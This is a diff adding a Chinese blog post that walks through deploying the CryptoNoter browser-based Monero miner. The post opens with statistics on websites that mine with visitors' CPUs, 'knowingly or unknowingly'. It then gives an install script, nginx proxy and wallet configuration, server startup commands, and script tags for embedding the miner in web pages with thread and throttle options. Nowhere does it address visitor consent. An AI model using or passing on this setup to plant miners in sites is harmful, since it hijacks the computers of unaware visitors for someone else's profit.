@@ -1,0 +1,143 @@
+---
+title: 门罗币挖矿网页的搭建
+comments: false
+date: 2018-03-23 10:17:45
+categories: 矿池
+tags:
+- lucas56
+- 矿池
+- 门罗币
+img:
+---
+2017年9月18日全球最大的BT下载网站海盗湾利用网页内嵌的Javascript程序（一段JS代码），“借用”浏览者的电脑用作挖掘虚拟货币的用途，也就是挖矿.
+
+根据360网络安全研究院发布的被挂挖矿代码网站的分析
+0.2% 的网站在首页嵌入了Web挖矿代码：
+
+* Alexa Top 10万的网站中，有 241 (0.24%) ； Alexa Top 30万的网站中，有 629 (0.21%)
+
+* 色情相关网站是主体，占据了这些网站的49%。其它还有诈骗（8%）、广告（7%）、挖矿（7%）、影视（6%）等类别
+
+* 10+ 挖矿网站提供挖矿能力支撑，其中最大的是是 coinhive.com，占据了大约 57% 的份额，然后是 coin-hive.com (8%)、load.jsecoin.com (7%)、webmine.pro(4%)、authedmine.com (4%) 及其他.
+
+当前网页挖矿已经成为一个市场，市场中的角色包括：
+
+* 终端用户：当前他们的利益是被忽视的
+* 挖矿网站：新玩家，提供网页挖矿脚本和能力
+* 内容/流量网站：既有网站，有庞大的用户但缺少变现手段.现在他们将既往无利可图的流量导向挖矿网站，利用消费者的算力网页挖矿，完成变现。最近也开始有一些内容网站，他们自行搭建挖矿能力，肥水不留外人田.
+
+
+对比一般挖矿,矿工需要主动使用挖矿客户端进行CPU或GPU计算,而在使用网页内嵌Javascript进行挖矿,只需要浏览者在知情或不知情的情况下产生的CPU或GPU计算.
+
+<h1>安装</h1>
+为了方便,这里使用开源的cryptonoter脚本直接搭建,os是ubuntu sever 16.04 + nginx.
+
+```
+curl https://raw.githubusercontent.com/cryptonoter/CryptoNoter/master/install.sh > install.sh
+chmod +x install.sh
+./install.sh
+```
+
+在安装过程中需要,需要指定Monero钱包地址,如果未指定钱包地址，安装程序会在继续安装之前提示.这里也可以直接使用交易所或者钱包地址.
+
+```
+Listen Port (7777) >                 //监听端口默认7777
+Your Domain (localhost) >              //域名
+[3] Pool Host&Port (pool.cryptonoter.com:1111) >   //矿池服务器
+[4] Your XMR /ETN / BCN wallet (Important) >     //钱包地址
+```
+
+确定以上信息后,脚本会自动向 /etc/nginx/sites-available 里写入配置文件 CryptoNoter.conf , 这里方便测试,直接修改 /etc/nginx/nginx.conf ,在http字段插入CryptoNoter.conf后重新加载nginx配置:
+```
+include /etc/nginx/sites-enabled/CryptoNoter.conf;
+nginx -s reload
+```
+当然也可以自行配制nginx.conf:
+```
+  location /proxy {  
+ 	add_header 'Access-Control-Allow-Origin' * always;
+ 	proxy_pass http://localhost:7777;
+    proxy_http_version 1.1;
+    proxy_set_header Upgrade $http_upgrade;
+    proxy_set_header Connection "upgrade";
+   }
+```
+
+
+ <h1>配置</h1>
+ 
+ 首先进去/srv/CryptoNoter/web/目录,复制config.EXAMPLE.json里的配置到config.json.
+ 
+```
+cd /srv/CryptoNoter
+cp config.EXAMPLE.json config.json 
+```
+可以修改config.json的内容以适配:
+
+```
+{
+  "lhost": "127.0.0.1",      //网站IP
+  "lport": 7777,          //网站端口
+  "domain": "localhost",      //域名
+  "pool": "mine.ppxxmr.com:3333", //矿池
+  "addr": "44RPVcXkWm8br7CDSmMhMq7Ku5ravkgDPRVZuCG2CQ5FX1WYV5BhntMS7Ymba5imFFMvfvWqjcvxehJcUYmWPFWQEsNz8iK",              //钱包地址
+  "pass": "x"           //挖矿密码
+}
+```
+
+将worker.js, processor.js , lib/cryptonight-asmjs.min.js 里的 %CryptoNoter_domain% 替换为自己的域名,例如:
+```
+self.CryptoNoter = self.CryptoNoter || {};
+self.CryptoNoter.CONFIG = {
+  LIB_URL: "https://%CryptoNoter_domain%/lib/",
+  WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
+  CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",
+  MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"
+};
+```
+* 注意这个坑,如果网站没有或没有使用ssl证书,需要把 wss://1.2.3.4 修改为 ws://1.2.3.4 .
+
+替换完以上内容就可以启动了:
+```
+forever start /srv/CryptoNoter/server.js //后台运行
+或
+node /srv/CryptoNoter/server.js
+```
+可以使用 forever list 来查看当前的运行状态.
+
+```
+info:  Forever processes running
+data:    uid command    script           forever pid id logfile         uptime
+data:  [0] tX4L /usr/bin/node /srv/CryptoNoter/server.js 7379  7385  /root/.forever/tX4L.log 0:0:59:11.96
+```
+
+这时候已经可以在网页挖矿了,在网页内插入:
+
+```html
+<script src="https://www.cryptonoter.com/processor.js"></script>   //这里域名改成自己的
+<script>
+  var miner = new CryptoNoter.User('CryptoNoter').start();
+</script>
+```
+
+也可以使用参数来控制挖矿:
+```html
+* autothreads（value）矿工开始的线程数量。 
+设置为true将自动检测用户计算机上可用的CPU内核数量。
+
+* throttle（value）设置线程闲置的时间比例。 值0表示不节流（即全速），值0.5表示线程将在50％的时间内保持空闲状态，其中0.8表示80％的时间保持空闲状态.
+
+<script src="https://www.cryptonoter.com/processor.js"></script>  //地址一定要换成自己的
+<script>
+	var addr = 'CryptoNoter';
+	var miner = new CryptoNoter.User(addr, {
+    autoThreads: true,
+	throttle: 0.8
+	});
+	miner.start();
+</script>
+```
+
+可以把上面的代码插入到demo.html中进行测试,打开 http://1.2.3.4/demo.html 后会显示出挖矿信息,同时cpu使用量飙升.
+
+这时打开自己接入的矿池,输入钱包地址就可以等着收益了.
